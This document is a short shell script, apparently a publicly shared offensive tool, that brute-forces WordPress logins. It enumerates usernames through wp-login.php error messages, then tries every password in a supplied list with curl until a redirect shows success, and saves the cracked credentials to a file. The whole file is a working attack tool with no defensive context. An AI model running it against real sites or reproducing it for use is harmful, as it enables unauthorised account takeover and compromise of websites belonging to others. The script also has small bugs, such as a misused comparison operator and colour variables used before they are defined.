#!/bin/sh
# Bruteforce single Wordpress
# Created: 19-06-2021
# Script Author : Chi Vo
# Usage: sh wordpress.sh http://localhost/wp-login.php user.txt pass.txt

check_login_form() {
	TARGET=$1
	echo "Check site live ..."
	response=$(curl -kis -X POST "$TARGET" -d "log=&pwd=" | grep "loginform" | wc -l)
	if [ $response > 0 ]; then
		echo "Target Ok"
	else
		echo "${RED}Target not work !"
		exit
	fi
}

crack_pass() {
	TARGET=$1
	USER=$2
	PASS_LIST=$3
	while read p; do
		echo "Trying pass: $p"
		response=$(curl -kis -X POST "$TARGET" -d "log=$USER&pwd=$p" | grep "302 Found" | wc -l)
		if [ $response = 1 ]; then
			echo "Pass Found: $p"
			PASSWORD=$p
			break
		fi
	done <$PASS_LIST
	if [ ! "$PASSWORD" ]; then
		echo "${RED}Password not found with username: $USERCRACKED"
		exit
	fi
}

crack_user() {
	TARGET=$1
	USER_LIST=$2
	while read u; do
		echo "Trying user: $u"
		response=$(curl -kis -X POST "$TARGET" -d "log=$u&pwd=admin" | grep "Unknown username" | wc -l)
		if [ $response = 0 ]; then
			echo "${GREEN}User Found: $u ${NC}"
			USERCRACKED=$u
			break
		fi
	done <$USER_LIST
	if [ ! "$USERCRACKED" ]; then
		echo "${RED}User not found"
		exit
	fi
}

usage() {
	echo "Usage: sh $0 http://localhost/wp-login.php user.txt pass.txt"
}

# Color
LIGHTRED='\033[1;31m'
RED='\033[0;31m'
GREEN='\033[0;32m'
LIGHTGREEN='\033[1;32m'
NC='\033[0m'

TARGET=$1
USER_LIST=$2
PASS_LIST=$3

if [ ! "$TARGET" ]; then
	usage
	exit
fi
if [ ! "$USER_LIST" ]; then
	usage
	exit
fi
if [ ! "$PASS_LIST" ]; then
	usage
	exit
fi

echo "Cracking target : $TARGET"
check_login_form $TARGET
crack_user $TARGET $USER_LIST
crack_pass $TARGET $USERCRACKED $PASS_LIST
echo
echo "${GREEN}Cracked Successfully!"
echo "User: $USERCRACKED"
echo "Pass: $PASSWORD"
echo "$TARGET|$USERCRACKED|$PASSWORD" >result.txt
